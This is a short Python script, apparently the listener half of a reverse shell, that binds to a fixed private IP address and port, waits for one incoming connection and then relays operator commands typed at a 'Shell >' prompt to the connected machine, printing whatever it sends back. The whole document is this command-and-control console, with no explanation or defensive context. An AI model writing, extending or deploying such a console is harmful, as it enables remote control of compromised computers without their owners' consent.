import socket 
import os

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("10.52.84.19", 6000))
s.listen()
conn, addr = s.accept()

ref = ""

while True: 

    command = input("Shell > ")
    if command != ref :
        conn.send(command.encode())
        s.listen()
        result= conn.recv(2048)
        print(result.decode('ISO-8859-1'))
    if command.lower() == "exit":
        print("Au revoir")
        break

    





